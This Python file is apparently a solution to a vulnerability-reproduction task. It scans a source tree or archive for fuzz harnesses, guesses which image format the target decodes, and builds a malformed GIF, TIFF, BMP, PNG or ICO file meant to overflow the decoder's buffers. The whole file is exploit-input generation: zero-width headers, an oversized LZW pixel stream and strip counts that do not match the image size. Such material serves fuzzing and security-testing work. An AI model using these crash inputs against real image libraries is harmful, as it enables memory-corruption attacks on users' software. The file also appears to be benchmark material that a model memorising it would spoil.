import os
import re
import tarfile
import zipfile
import zlib
import struct
from typing import Dict, List, Tuple, Optional, Iterable


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp",
    ".m", ".mm",
    ".rs", ".go", ".java", ".py",
    ".txt", ".md", ".rst",
    ".cmake", ".mk", ".make", ".am", ".in",
    ".sh", ".bazel", ".bzl",
    ".gn", ".gni",
}


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _is_text_candidate(name_l: str) -> bool:
    base = os.path.basename(name_l)
    if base in ("cmakelists.txt", "makefile", "build.sh", "configure.ac", "configure.in"):
        return True
    _, ext = os.path.splitext(name_l)
    return ext in _TEXT_EXTS


def _iter_src_files(src_path: str) -> Iterable[Tuple[str, int, callable]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                name = os.path.relpath(path, src_path).replace(os.sep, "/")
                size = st.st_size

                def _reader(p=path):
                    with open(p, "rb") as f:
                        return f.read()

                yield name, size, _reader
        return

    # Try tar
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                size = m.size

                def _reader_tar(member=m):
                    fobj = tf.extractfile(member)
                    if fobj is None:
                        return b""
                    try:
                        return fobj.read()
                    finally:
                        try:
                            fobj.close()
                        except Exception:
                            pass

                yield name, size, _reader_tar
        return
    except Exception:
        pass

    # Try zip
    try:
        with zipfile.ZipFile(src_path, "r") as zf:
            for zi in zf.infolist():
                if zi.is_dir():
                    continue
                name = zi.filename
                size = zi.file_size

                def _reader_zip(info=zi):
                    with zf.open(info, "r") as f:
                        return f.read()

                yield name, size, _reader_zip
        return
    except Exception:
        pass

    # Unknown container, treat as empty
    return


def _analyze_sources(src_path: str) -> Tuple[List[str], List[Tuple[str, str]]]:
    filenames_l: List[str] = []
    harness_texts: List[Tuple[str, str]] = []

    total_text_read = 0
    max_total_text_read = 24 * 1024 * 1024

    max_file_read = 2 * 1024 * 1024
    max_harness_file_read = 4 * 1024 * 1024

    harness_name_hints = ("fuzz", "fuzzer", "ossfuzz", "afl", "honggfuzz", "libfuzzer", "testoneinput")

    for name, size, reader in _iter_src_files(src_path):
        name_l = name.lower()
        filenames_l.append(name_l)

        if size <= 0:
            continue

        is_text = _is_text_candidate(name_l)
        is_harnessish = any(h in name_l for h in harness_name_hints)

        should_read = False
        limit = max_file_read
        if is_harnessish and is_text:
            should_read = True
            limit = max_harness_file_read
        elif is_text and total_text_read < max_total_text_read:
            # Read some build/source files too, but lightly
            base = os.path.basename(name_l)
            if base in ("cmakelists.txt", "makefile", "build.sh") or any(x in name_l for x in ("fuzz", "fuzzer")):
                should_read = True
                limit = max_file_read
            elif name_l.endswith((".c", ".cc", ".cpp", ".cxx")) and total_text_read < max_total_text_read // 2:
                should_read = True
                limit = 512 * 1024

        if not should_read:
            continue

        try:
            b = reader()
            if len(b) > limit:
                b = b[:limit]
        except Exception:
            continue

        total_text_read += len(b)
        if total_text_read > max_total_text_read:
            # still keep this file, but stop further heavy reads by making reads rarer
            pass

        t = _safe_decode(b)
        tl = t.lower()
        if "llvmfuzzertestoneinput" in tl or "fuzzertestoneinput" in tl:
            harness_texts.append((name_l, tl))
        elif is_harnessish and ("read" in tl or "load" in tl or "decode" in tl or "parse" in tl):
            # might still provide format clues
            harness_texts.append((name_l, tl))

    return filenames_l, harness_texts


def _score_format(filenames_l: List[str], harness_texts: List[Tuple[str, str]]) -> Dict[str, int]:
    scores: Dict[str, int] = {
        "ico": 0,
        "gif": 0,
        "tiff": 0,
        "bmp": 0,
        "png": 0,
        "jpeg": 0,
        "psd": 0,
        "tga": 0,
        "webp": 0,
        "svg": 0,
    }

    def add(fmt: str, v: int):
        scores[fmt] = scores.get(fmt, 0) + v

    fmt_name_patterns: Dict[str, List[Tuple[str, int]]] = {
        "ico": [(r"(?:^|/|_|-)(?:ico|icon)(?:$|/|_|-|\.|s)", 8), (r"\.ico$", 25), (r"\.cur$", 25), (r"icondir", 20), (r"cursor", 6)],
        "gif": [(r"(?:^|/|_|-)gif(?:$|/|_|-|\.|s)", 10), (r"\.gif$", 25), (r"giflib", 20)],
        "tiff": [(r"(?:^|/|_|-)(?:tif|tiff)(?:$|/|_|-|\.|s)", 12), (r"\.tif$", 25), (r"\.tiff$", 25), (r"libtiff", 25)],
        "bmp": [(r"(?:^|/|_|-)bmp(?:$|/|_|-|\.|s)", 10), (r"\.bmp$", 25), (r"bitmap", 10)],
        "png": [(r"(?:^|/|_|-)png(?:$|/|_|-|\.|s)", 10), (r"\.png$", 25), (r"libpng", 20)],
        "jpeg": [(r"(?:^|/|_|-)(?:jpeg|jpg)(?:$|/|_|-|\.|s)", 10), (r"\.jpe?g$", 25), (r"libjpeg", 20), (r"turbojpeg", 20)],
        "psd": [(r"(?:^|/|_|-)psd(?:$|/|_|-|\.|s)", 10), (r"\.psd$", 25)],
        "tga": [(r"(?:^|/|_|-)tga(?:$|/|_|-|\.|s)", 10), (r"\.tga$", 25)],
        "webp": [(r"(?:^|/|_|-)webp(?:$|/|_|-|\.|s)", 10), (r"\.webp$", 25)],
        "svg": [(r"(?:^|/|_|-)svg(?:$|/|_|-|\.|s)", 10), (r"\.svg$", 25), (r"librsvg", 20)],
    }

    for fn in filenames_l:
        for fmt, pats in fmt_name_patterns.items():
            for pat, w in pats:
                if re.search(pat, fn):
                    add(fmt, w)

    # Content patterns, prioritize harness texts
    fmt_content_patterns: Dict[str, List[Tuple[str, int]]] = {
        "ico": [
            (r"\.ico\b", 30),
            (r"image/x-icon", 40),
            (r"\bicondir\b", 50),
            (r"\bicon\b", 10),
            (r"\bcur\b", 10),
            (r"gdk_pixbuf__ico", 120),
            (r"\bico_.*load\b", 80),
            (r"\bico.*decoder\b", 40),
        ],
        "gif": [
            (r"\.gif\b", 30),
            (r"gif89a", 40),
            (r"gif87a", 40),
            (r"\bdgif", 120),
            (r"\begif", 120),
            (r"\bgiflib\b", 120),
            (r"\bgif.*decode", 40),
        ],
        "tiff": [
            (r"\.tiff?\b", 30),
            (r"\btiffopen\b", 140),
            (r"\blibtiff\b", 140),
            (r"\btif_dir\b", 40),
            (r"\btiff.*decode", 40),
        ],
        "bmp": [
            (r"\.bmp\b", 30),
            (r"\bbitmap\b", 30),
            (r"\bbmp\b", 25),
            (r"biwidth", 25),
            (r"biheight", 25),
        ],
        "png": [
            (r"\.png\b", 30),
            (r"\bpng_read_info\b", 140),
            (r"\blibpng\b", 140),
            (r"\bpng_sig_cmp\b", 60),
        ],
        "jpeg": [
            (r"\.jpe?g\b", 30),
            (r"\bjpeg_read_header\b", 140),
            (r"\blibjpeg\b", 140),
            (r"\bturbojpeg\b", 120),
        ],
        "webp": [
            (r"\.webp\b", 30),
            (r"\bwebpdecode\b", 140),
            (r"\blibwebp\b", 140),
        ],
        "svg": [
            (r"<svg", 30),
            (r"\bsvg\b", 20),
            (r"\blibrsvg\b", 120),
        ],
        "psd": [
            (r"\bpsd\b", 20),
            (r"8bps", 40),
        ],
        "tga": [
            (r"\btga\b", 20),
            (r"\.tga\b", 30),
        ],
    }

    for hname, htxt in harness_texts:
        # Large boost if harness filename suggests format
        if "ico" in hname or "icon" in hname or ".ico" in hname:
            add("ico", 120)
        if "gif" in hname:
            add("gif", 120)
        if "tif" in hname or "tiff" in hname:
            add("tiff", 120)
        if "bmp" in hname:
            add("bmp", 120)
        if "png" in hname:
            add("png", 120)

        # Content patterns
        for fmt, pats in fmt_content_patterns.items():
            for pat, w in pats:
                if re.search(pat, htxt):
                    add(fmt, w)

        # General indicator: if stbi is used, GIF is a good default exploiter for dim issues
        if "stbi_load_from_memory" in htxt or "stbi__" in htxt or "stb_image" in htxt:
            add("gif", 60)
            add("bmp", 30)
            add("tga", 30)
            add("png", 30)
            add("jpeg", 30)

        if "gdk_pixbuf_new_from_data" in htxt or "gdk_pixbuf_new_from_file" in htxt or "gdk_pixbuf_loader" in htxt:
            add("ico", 80)
            add("gif", 30)
            add("png", 30)

    return scores


def _choose_format(scores: Dict[str, int]) -> str:
    items = sorted(scores.items(), key=lambda kv: kv[1], reverse=True)
    best_fmt, best_score = items[0]
    second_score = items[1][1] if len(items) > 1 else 0

    # Conservative fallback: if no signal, use GIF.
    if best_score <= 0:
        return "gif"

    # If weak and ambiguous, default to GIF (common multi-format entry point).
    if best_score < 70 and best_score - second_score < 25:
        return "gif"

    return best_fmt


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(ctype)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", crc)


def make_png_rgba(width: int, height: int, fill_rgba: bytes = b"\x00\x00\x00\x00") -> bytes:
    if len(fill_rgba) != 4:
        fill_rgba = (fill_rgba + b"\x00\x00\x00\x00")[:4]
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", width & 0xFFFFFFFF, height & 0xFFFFFFFF, 8, 6, 0, 0, 0)
    # Raw scanlines: filter byte 0 + RGBA pixels
    row = b"\x00" + fill_rgba * max(0, width)
    raw = row * max(0, height)
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def make_ico_with_png(png_w: int = 256, png_h: int = 256, dir_w: int = 0, dir_h: int = 0) -> bytes:
    png = make_png_rgba(png_w, png_h, b"\x00\x00\x00\x00")
    # ICONDIR
    out = bytearray()
    out += struct.pack("<HHH", 0, 1, 1)
    # ICONDIRENTRY
    # Width/Height are 1 byte, 0 can indicate 256; vulnerability may mishandle zero.
    w_b = dir_w & 0xFF
    h_b = dir_h & 0xFF
    out += struct.pack("<BBBBHHII", w_b, h_b, 0, 0, 1, 32, len(png), 6 + 16)
    out += png
    return bytes(out)


def make_gif_overflow(n_pixels: int = 2048) -> bytes:
    if n_pixels < 1:
        n_pixels = 1

    # Header + Logical Screen Descriptor (1x1) + GCT (2 colors)
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 1, 1, 0x80, 0, 0)  # GCT flag=1, size=2 colors
    gct = b"\x00\x00\x00\xff\xff\xff"

    # Image Descriptor: set width=0, height=1 (zero width triggers many wrap issues)
    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)

    lzw_min_code_size = b"\x02"  # 2 -> clear=4, eoi=5, initial codes 0..3, code size starts at 3 bits

    # Code stream: repeat [CLEAR(4), 0] to emit pixels while keeping code size at 3 bits, then EOI(5)
    bitbuf = 0
    bitcnt = 0
    data = bytearray()

    def emit3(code: int):
        nonlocal bitbuf, bitcnt, data
        bitbuf |= (code & 0x7) << bitcnt
        bitcnt += 3
        while bitcnt >= 8:
            data.append(bitbuf & 0xFF)
            bitbuf >>= 8
            bitcnt -= 8

    for _ in range(n_pixels):
        emit3(4)
        emit3(0)
    emit3(5)
    if bitcnt:
        data.append(bitbuf & 0xFF)

    # Split into sub-blocks of 255 bytes
    blocks = bytearray()
    i = 0
    while i < len(data):
        chunk = data[i:i + 255]
        blocks.append(len(chunk))
        blocks += chunk
        i += 255
    blocks.append(0)  # block terminator

    trailer = b"\x3B"
    return header + lsd + gct + img_desc + lzw_min_code_size + bytes(blocks) + trailer


def make_tiff_overflow(width: int = 0, height: int = 1, strip_byte_count: int = 1024) -> bytes:
    # Minimal little-endian TIFF with uncompressed single strip.
    # If width==0, some decoders might allocate 0 but still read strip bytes -> overflow.
    if height < 1:
        height = 1
    if strip_byte_count < 1:
        strip_byte_count = 1

    # Header
    out = bytearray()
    out += b"II"
    out += struct.pack("<H", 42)
    out += struct.pack("<I", 8)  # IFD offset

    # IFD with 10 entries
    entries = []

    def add_entry(tag: int, typ: int, count: int, value_or_offset: int):
        entries.append(struct.pack("<HHII", tag, typ, count, value_or_offset))

    # We will place BitsPerSample array right after IFD, followed by strip data.
    n_entries = 10
    ifd_start = 8
    ifd_size = 2 + n_entries * 12 + 4
    bps_offset = ifd_start + ifd_size
    strip_offset = bps_offset + 6

    add_entry(256, 4, 1, width & 0xFFFFFFFF)   # ImageWidth LONG
    add_entry(257, 4, 1, height & 0xFFFFFFFF)  # ImageLength LONG
    add_entry(258, 3, 3, bps_offset)           # BitsPerSample SHORT[3]
    add_entry(259, 3, 1, 1)                    # Compression SHORT = 1 (none)
    add_entry(262, 3, 1, 2)                    # PhotometricInterpretation SHORT = 2 (RGB)
    add_entry(273, 4, 1, strip_offset)         # StripOffsets LONG
    add_entry(277, 3, 1, 3)                    # SamplesPerPixel SHORT = 3
    add_entry(278, 4, 1, 1)                    # RowsPerStrip LONG = 1
    add_entry(279, 4, 1, strip_byte_count)     # StripByteCounts LONG
    add_entry(284, 3, 1, 1)                    # PlanarConfiguration SHORT = 1 (contig)

    out += struct.pack("<H", n_entries)
    for e in entries:
        out += e
    out += struct.pack("<I", 0)  # next IFD = 0

    # BitsPerSample array (8,8,8)
    out += struct.pack("<HHH", 8, 8, 8)

    # Strip data (all zeros)
    out += b"\x00" * strip_byte_count
    return bytes(out)


def make_bmp_overflow() -> bytes:
    # A minimal BMP where width=0 but biSizeImage is non-zero and pixel data exists.
    # Some decoders may allocate using width/height but read sizeimage.
    bfType = b"BM"
    bfOffBits = 14 + 40
    pixel_data = b"\x00\x00\x00\x00"  # 4 bytes
    biSizeImage = len(pixel_data)

    bfSize = bfOffBits + biSizeImage
    file_header = struct.pack("<2sIHHI", bfType, bfSize, 0, 0, bfOffBits)
    info_header = struct.pack(
        "<IIIHHIIIIII",
        40,          # biSize
        0,           # biWidth
        1,           # biHeight
        1,           # biPlanes
        24,          # biBitCount
        0,           # biCompression (BI_RGB)
        biSizeImage, # biSizeImage
        0, 0,        # biXPelsPerMeter, biYPelsPerMeter
        0, 0         # biClrUsed, biClrImportant
    )
    return file_header + info_header + pixel_data


def make_png_zero_width() -> bytes:
    # PNG with width=0, height=1; some custom parsers might mishandle.
    return make_png_rgba(0, 1, b"\x00\x00\x00\x00")


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            filenames_l, harness_texts = _analyze_sources(src_path)
            scores = _score_format(filenames_l, harness_texts)
            fmt = _choose_format(scores)
        except Exception:
            fmt = "gif"

        if fmt == "ico":
            return make_ico_with_png(256, 256, 0, 0)
        if fmt == "tiff":
            return make_tiff_overflow(0, 1, 1536)
        if fmt == "bmp":
            return make_bmp_overflow()
        if fmt == "png":
            return make_png_zero_width()
        if fmt == "gif":
            return make_gif_overflow(2048)

        # Fallbacks
        return make_gif_overflow(2048)